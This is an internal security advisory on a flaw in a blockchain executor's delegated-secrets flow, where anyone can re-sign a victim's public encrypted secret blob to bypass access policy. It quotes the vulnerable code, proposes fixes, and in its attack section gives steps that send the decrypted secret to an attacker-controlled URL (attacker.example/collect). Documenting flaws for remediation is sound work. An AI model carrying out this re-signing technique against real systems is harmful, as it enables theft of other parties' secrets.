# Security Finding — Delegated Secrets Re-Signing Bypass

**Date:** 2026-06-01
**Component:** `executor-go-internal` delegated-secrets flow (HTTP-call precompile `0x0801`)
**Status:** High-confidence code-level finding; not yet demonstrated end-to-end on a live network
**Severity (proposed):** High — bypass of the delegated-secrets access-control policy and potential cross-party secret theft

## Code pin — `origin/dev`

All evidence below is pinned to `origin/dev` of each repo at the following commits (fetched 2026-06-01):

| Repo | `origin/dev` commit |
|---|---|
| `executor-go-internal` | `3723d1d608bc1c66fc8ae5030583ee0e6914da23` |
| `ritual-common-internal` | `2a7002391053b1a30b753d8a0cc0d507d09b14f6` |
| `ritual-sc-internal` | `6b07c1aa1579e6e746c93d41ad20e747e4d6685d` |
| `traffic-gen-internal` | `ec2e3bee3261f917f54a1b7febb11b7be29e25b7` |

> **Important — branch divergence.** On `origin/dev` the HTTP-call handler uses the **authenticated**
> transaction sender (`ownerAddress := job.SenderAddress`) as the secret-ownership principal, and the
> `HTTPCallRequest` struct has **no `Sponsor` field**. The agent-identity / precompile-refactor feature
> branch (the worktree this finding was first drafted against) changes that line to
> `ownerAddress := request.Sponsor.Hex()` and adds a non-authoritative `Sponsor` field. The core
> finding holds on **both**; the feature branch is strictly worse (see §8). This document is written
> against `origin/dev`.

---

## 1. One-line summary

Secret "ownership" is established solely by an ECDSA signature over the encrypted blob, but the
blob is ECIES-encrypted to the **executor** (not to the owner or sender) and the signature is a
plain `personal_sign` over public bytes. Anyone who can see a ciphertext can re-sign it with their
own key, become the "owner" from the executor's point of view, and have the executor decrypt and
inject the plaintext secret into an attacker-controlled HTTP request.

On `origin/dev` the ownership principal is the *authenticated* sender (`job.SenderAddress`), which is
**necessary but not sufficient**: the attacker does not impersonate the victim — they use their own
authentic identity to claim the victim's *public ciphertext* as their own secret.

---

## 2. Background: how the delegated-secrets flow is supposed to work

Roles:

- **Owner** — the address that signed the encrypted secret blob; owns the secret. On `origin/dev`
  this is compared against `job.SenderAddress` (the authenticated transaction sender).
- **Delegate** — the transaction sender that wants to use a secret it does not own.
- **`SecretsAccessControl`** — on-chain contract
  ([`src/wallet/SecretsAccessControl.sol`](https://github.com/ritual-net/ritual-sc-internal/blob/6b07c1aa1579e6e746c93d41ad20e747e4d6685d/src/wallet/SecretsAccessControl.sol))
  that, given `(owner, delegate, secretsHash)`, returns `(hasAccess, SecretsAccessPolicy)`.

Intended runtime sequence (HTTP-call handler):

1. Recover the signer of each `encrypted_secrets[i]` from `secret_signature[i]`.
2. If `signer == sender` → fast path: the sender is using their own secret, empty (unrestricted) policy.
3. If `signer != sender` → call `checkAccess(owner=signer, delegate=sender, keccak256(ciphertext))`;
   require `hasAccess`, then enforce the returned policy (allowed destinations / methods / paths /
   query params / headers / secret location / body format).
4. Enforce policy pre-injection (URL/method/headers), decrypt, template-inject the secret, enforce
   post-injection (location/body format), and enforce policy on redirects.

The policy is the security control that restricts *where* a delegated secret may be sent and *how*.

---

## 3. The encryption vs. signature split (root of the problem)

When a secret is encrypted, the recipient key is the **executor's public key** — it has nothing to
do with the owner or the sender. The owner key is used only for a *detached* signature over the
ciphertext.

Traffic-gen (producer side) —
[`delegate_secret.py#L474-L476`](https://github.com/ritual-net/traffic-gen-internal/blob/ec2e3bee3261f917f54a1b7febb11b7be29e25b7/src/action/delegate_secret.py#L474-L476)
(executor key obtained at
[`#L891`](https://github.com/ritual-net/traffic-gen-internal/blob/ec2e3bee3261f917f54a1b7febb11b7be29e25b7/src/action/delegate_secret.py#L891)):

```python
# src/action/delegate_secret.py (origin/dev)
encrypted_secrets = ExecutorRequest.encrypt_secrets(secrets, executor_pk)        # sealed to EXECUTOR
signature         = create_secret_signature(encrypted_secrets, owner_private_key) # detached sig
secrets_hash      = Web3.keccak(encrypted_secrets)
```

Shared encrypt helper —
[`base.py#L294-L299`](https://github.com/ritual-net/ritual-common-internal/blob/2a7002391053b1a30b753d8a0cc0d507d09b14f6/src/ritual_common/executor/base.py#L294-L299):

> The recipient key depends on the request flow:
> - Executor precompile flow (legacy/common): encrypt to the executor's public key.
> - Sovereign factory/harness flow: encrypt to the agent's DKMS-derived key.

The signature (`create_secret_signature`) is a plain Ethereum personal-message signature over the
ciphertext bytes —
[`base.py#L486-L501`](https://github.com/ritual-net/ritual-common-internal/blob/2a7002391053b1a30b753d8a0cc0d507d09b14f6/src/ritual_common/executor/base.py#L486-L501):

```python
# src/ritual_common/executor/base.py (origin/dev)
def create_secret_signature(encrypted_secrets: bytes, private_key: str) -> bytes:
    ...
    message = encode_defunct(encrypted_secrets)
    account = Account.from_key(private_key)
    signature = account.sign_message(message)
```

**Consequences:**

- Decryptability depends only on the executor's private key. *Who signed is irrelevant to whether
  the executor can decrypt.*
- The signature is forgeable by anyone over any ciphertext they possess (it signs public bytes and
  carries no binding to the encryptor).
- Therefore the recovered "owner" is an unauthenticated, swappable claim about a public blob.

---

## 4. The attack (on `origin/dev`)

A party that possesses a victim's `encrypted_secrets` blob:

1. Re-signs the **unchanged** victim ciphertext with their **own** key:
   `sig = personal_sign(victim_ciphertext, attacker_key)`.
2. Submits an HTTP-call precompile transaction **as themselves** (so `job.SenderAddress = attacker`,
   authenticated) with:
   - `encrypted_secrets = [victim_blob]`
   - `secret_signature  = [attacker_sig]`
   - `url               = https://attacker.example/collect`
   - a body/header/URL containing the secret's key name as a template token.
3. Executor recovers signer = attacker = `sponsor` → **fast path** → empty policy →
   `usedDelegation=false` → decrypts the victim blob with its own key → injects the plaintext secret
   into the attacker's request → sends it to the attacker's server.

Result: the victim's secret is exfiltrated.

> Note: on `origin/dev` the attacker **must** re-sign with their own key. The "reuse the victim's
> original signature with `sponsor = victim`" variant does **not** work here, because the ownership
> principal is the authenticated `job.SenderAddress` (= attacker), and the victim's signature would
> recover to `victim != attacker`, routing to the delegation check (which fails with no grant). The
> re-sign step is trivial, so this is not a meaningful barrier.

---

## 5. Evidence (pinned to `origin/dev`)

**5.1 The ownership principal is the authenticated sender — but it doesn't matter.**
[`handler.go#L124-L142`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/handlers/httpcall/handler.go#L124-L142):

```go
// internal/handlers/httpcall/handler.go (origin/dev)
// The sender address comes from the job (transaction sender)
ownerAddress := job.SenderAddress
...
accessContext, err = delegatedsecrets.NewSecretsAccessContext(
    ctx,
    h.ethClient,
    h.secretsAccessControlAddress,
    request.EncryptedSecrets,
    request.SecretSignature,
    ownerAddress,
)
```

`job.SenderAddress` is authenticated and cannot be spoofed, so the attacker uses their *own*
identity — they are not impersonating the victim, they are claiming the victim's public ciphertext
as their own secret.

**5.2 Signer == sender takes the fast path: empty policy, no delegation, no contract call.**
[`fetch.go#L209-L219`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/delegatedsecrets/fetch.go#L209-L219):

```go
// internal/delegatedsecrets/fetch.go (origin/dev)
signerAddress, err := validator.RecoverSigner(encryptedSecrets, signature)
...
// If signer is the owner, no delegation check needed (fast path, no policy restrictions)
if validator.AddressesEqual(signerAddress, owner) {
    policies[i] = SecretsAccessPolicy{} // Owner has no policy restrictions
    continue                            // Skip delegation check for this blob
}
```

**5.3 Empty policy + no delegation = zero enforcement (HTTPS not even required).**
[`enforce.go#L38-L66`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/delegatedsecrets/enforce.go#L38-L66):

```go
// internal/delegatedsecrets/enforce.go (origin/dev)
func EnforcePolicies(... usedDelegation bool) error {
    if usedDelegation {
        if err := EnforceURLSecurity(requestURL); err != nil { return err }
    }
    if len(policies) == 0 { return nil }
    ...
    if !hasRestrictions { return nil }
```

**5.4 The signature is a forgeable personal-message sign over the ciphertext** (see §3,
[`base.py#L486-L501`](https://github.com/ritual-net/ritual-common-internal/blob/2a7002391053b1a30b753d8a0cc0d507d09b14f6/src/ritual_common/executor/base.py#L486-L501)).

**5.5 Decryption depends only on the executor's key; no owner field, no signer binding.**
[`ecies.go#L67-L78`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/utils/ecies.go#L67-L78):

```go
// internal/utils/ecies.go (origin/dev)
plaintext, err := ecies.DecryptWithPrefix(encryptedSecrets, privateKey)
...
var secrets map[string]string
if err := json.Unmarshal(plaintext, &secrets); err != nil { ... }
```

(Signer recovery itself:
[`signature.go#L37`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/utils/signature.go#L37).)

**5.6 The plaintext leaves via template injection into an attacker-chosen request.**
[`request.go#L482` (`ReplaceTemplates`)](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/handlers/httpcall/request.go#L482)
substitutes any occurrence of a secret's key name in URL / headers / body with the secret value,
then the request is sent to the attacker-controlled URL.

---

## 6. Two distinct impacts

1. **Policy bypass by the authorized delegate.** A delegate granted a restricted policy (e.g.
   destinations limited to `api.openai.com`) is the authenticated sender; it can re-sign the same
   blob with its own key and escape *all* restrictions via the fast path. The on-chain policy is
   advisory against the very party it is meant to constrain. No extra knowledge required — the
   delegate already holds the blob and knows key names.

2. **Cross-party theft by an outsider.** `encrypted_secrets` appears in plaintext in the calldata of
   every legitimate HTTP-call transaction that uses secrets; chain calldata is public. Anyone can
   scrape a victim's blob, submit their own (authenticated) transaction, re-sign the blob, and hit
   the fast path. The only practical hurdle is knowing the secret's JSON *key name* to place the
   template token — and key names are not secret (`API_KEY`, `AUTHORIZATION`, etc.).

---

## 7. Why existing protections don't catch it

- The fast path (`signer == sender`) is intended as "you're using your own secret, do what you like."
  Because secret ownership is asserted by a forgeable signature over a public ciphertext, an attacker
  simply makes themselves the owner of the victim's blob.
- Using the **authenticated** `job.SenderAddress` (as `origin/dev` does) is necessary but not
  sufficient: it prevents impersonating the victim, but not claiming the victim's ciphertext under
  the attacker's own identity.
- There is no nonce / request-binding / TTL-on-the-secret; replay of a captured ciphertext is
  unrestricted (the attacker submits a fresh transaction with their own TTL).
- Decryptability is independent of the signature, so swapping the signature changes nothing about
  whether the executor will hand back the plaintext.

---

## 8. Working-tree / feature-branch divergence (strictly worse)

The agent-identity / precompile-refactor feature branch changes the ownership principal from the
authenticated sender to a calldata-supplied `Sponsor`:

- `ownerAddress := request.Sponsor.Hex()` instead of `job.SenderAddress`.
- Adds a `Sponsor` field documented as *"Payment sponsor decoded for parity/logging; authority
  remains on-chain"*, and never compares it to `job.SenderAddress`.

On that branch the attack is even easier: the attacker need not be a specific sender at all — they set
`sponsor` to any address they control and sign with the matching key. This reintroduces a fully
attacker-chosen ownership principal. Both the `origin/dev` and feature-branch variants are fixed by §9
option (1); the feature branch additionally needs option (3) (make the sender authoritative again).

---

## 9. Honest scoping — what could reduce or refute severity

This is a high-confidence MAP estimate from code reading, **not** a demonstrated live exploit.
Open items that would firm up or narrow the impact:

- **TEE / submission authorization.** If the HTTP-call precompile can only be invoked by restricted
  senders in production, impact #2 (outsider) narrows. Impact #1 (delegate self-escalation) survives,
  since the delegate is an authorized submitter.
- **Calldata publicity.** Confirm `encrypted_secrets` actually lands in public calldata in production
  vs. a private submission path. (Inferred from the `PrecompileConsumer` → precompile model.)
- **Key-name knowledge.** A real but weak obstacle for the pure-outsider variant; no obstacle for the
  malicious-delegate variant.
- **Other handlers.** This was traced in the HTTP-call handler. The persistent-agent handler
  deliberately skips delegated-secrets validation (owner-only). Sweep the other importers for the
  same fast-path shape: `llmcall`, `longrunninghttp`, `imagecall`, `audiocall`, `videocall`,
  `fhecall`, `zktwophase`.

---

## 10. Fix options

The structural problem: signature-as-identity is meaningless when the signed object is public and
decryptability is independent of the signer. Options, roughly in order of robustness:

0. **Authenticated encryption keyed by both the owner and the executor (recommended foundation).**
   Replace the current *sealed box* (ephemeral-sender ECIES, encrypted to the executor only) with an
   *authenticated box*: derive the AES key from a sender↔executor ECDH and require the executor to
   take the sender (owner) public key from the **signature it recovered**, not from a separate
   calldata field:

   ```
   K = KDF( ECDH(owner_priv,    executor_pub) )   # owner encrypts
   K = KDF( ECDH(executor_priv, owner_pub)    )   # executor decrypts (same K); owner_pub = recovered signer
   ```

   This makes the recovered-signer identity and the decryption key the *same* cryptographic fact:
   - Re-signing with the attacker's key changes the recovered key → `ECDH(executor_priv, attacker_pub)`
     → **AES-GCM auth-tag failure** → the plaintext is never materialized. Fails closed at the
     crypto layer (stronger than option 1, which decrypts-then-checks).
   - The attacker cannot forge a ciphertext that decrypts under their own key without the plaintext.
   - Fixes **both** impacts: cross-party theft (victim's blob won't decrypt for anyone else) and
     delegate policy-escape (a delegate can't re-sign to take the fast path; it must use the owner's
     signature, which forces `signer ≠ sender` → delegation check + policy).

   This is the well-known NaCl/libsodium `crypto_box` / Noise `K`/`IK` pattern. Caveats:
   - **Peer-key provenance is load-bearing**: `owner_pub` must come from the recovered signature
     (secp256k1 recovery yields the pubkey; the P256/passkey signature format already carries it),
     never an attacker-suppliable field.
   - **Nonce uniqueness is critical**: a static↔static ECDH yields a fixed key per `(owner, executor)`
     pair, so AES-GCM requires a guaranteed-unique nonce per message (the ephemeral sealed box got
     per-message randomness for free).
   - **Forward secrecy**: static↔static loses the FS the current ephemeral ECIES has. To keep it, mix
     both DHs — `KDF( DH(ephemeral, executor_static) ‖ DH(owner_static, executor_static) )` (Noise
     `IK`/`X`, a.k.a. ECIES-with-sender-authentication): ephemeral gives FS, the static sender DH gives
     the re-sign-proof binding.
   - **Owners without a keypair can't do sender-side ECDH.** The canonical model allows the
     agent-identity owner to be a launching dapp *contract* (no private key). For the HTTP-call secrets
     path the "owner" is the secret signer (an EOA/passkey, as in `delegate_secret.py`), so this is
     likely fine — but confirm no contract-as-secret-owner case exists; if it does, fall back to (1)/(2)
     for it.
   - Keep the existing signature (it still provides the owner *address* for the on-chain
     `checkAccess(owner, delegate, keccak256(ct))` grant lookup, and now doubles as the ECDH peer key).

1. **Bind the secret to its owner at encryption time.** Embed the owner
   address inside the encrypted plaintext (and/or AAD) and require the recovered signer to equal it.
   Re-signing then fails: the attacker can't change the embedded owner without re-doing the executor
   encryption (which they can do, but then it's *their* secret, not the victim's). Fixes both the
   `origin/dev` and feature-branch variants. Weaker than (0) only in that the executor decrypts the
   attacker-presented blob *before* rejecting on owner mismatch (plaintext briefly materialized in
   executor memory — acceptable only because the executor is TEE-resident).
2. **Bind the secret to the request.** Have the owner sign `(ciphertext ‖ allowed-destination ‖
   nonce/expiry)` instead of the bare ciphertext, so a blob cannot be retargeted to an attacker URL.
3. **Keep the ownership principal authoritative.** `origin/dev` already uses `job.SenderAddress`;
   the feature branch must revert to that (or check `sponsor == job.SenderAddress`). Necessary but,
   alone, does **not** stop a delegate re-signing as themselves — must be combined with (0) or (1).

Recommendation: (0) as the base — it is the only option that makes decryption itself impossible for
the wrong party (fail-closed crypto) rather than relying on a post-decrypt check; (1) is an acceptable
simpler alternative given a trusted/TEE executor. Consider (2) additionally to constrain retargeting.

---

## 11. Key files (`origin/dev` permalinks)

- [`executor-go-internal/internal/handlers/httpcall/handler.go`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/handlers/httpcall/handler.go) — orchestration, `job.SenderAddress` as owner
- [`executor-go-internal/internal/handlers/httpcall/request.go`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/handlers/httpcall/request.go) — `HTTPCallRequest` (no `Sponsor` on dev), `ReplaceTemplates`
- [`executor-go-internal/internal/delegatedsecrets/fetch.go`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/delegatedsecrets/fetch.go) — `ValidateSecretSignatures`, fast path
- [`executor-go-internal/internal/delegatedsecrets/enforce.go`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/delegatedsecrets/enforce.go) — `EnforcePolicies`
- [`executor-go-internal/internal/delegatedsecrets/context.go`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/delegatedsecrets/context.go) — `SecretsAccessContext`
- [`executor-go-internal/internal/utils/ecies.go`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/utils/ecies.go) — ECIES decrypt (executor key only)
- [`executor-go-internal/internal/utils/signature.go`](https://github.com/ritual-net/executor-go-internal/blob/3723d1d608bc1c66fc8ae5030583ee0e6914da23/internal/utils/signature.go) — `RecoverSigner`
- [`ritual-common-internal/src/ritual_common/executor/base.py`](https://github.com/ritual-net/ritual-common-internal/blob/2a7002391053b1a30b753d8a0cc0d507d09b14f6/src/ritual_common/executor/base.py) — `encrypt_secrets`, `create_secret_signature`
- [`ritual-sc-internal/src/wallet/SecretsAccessControl.sol`](https://github.com/ritual-net/ritual-sc-internal/blob/6b07c1aa1579e6e746c93d41ad20e747e4d6685d/src/wallet/SecretsAccessControl.sol) — `grantAccess` (L84) / `revokeAccess` (L99) / `checkAccess` (L110)
- [`traffic-gen-internal/src/action/delegate_secret.py`](https://github.com/ritual-net/traffic-gen-internal/blob/ec2e3bee3261f917f54a1b7febb11b7be29e25b7/src/action/delegate_secret.py) — producer + delegation grant test
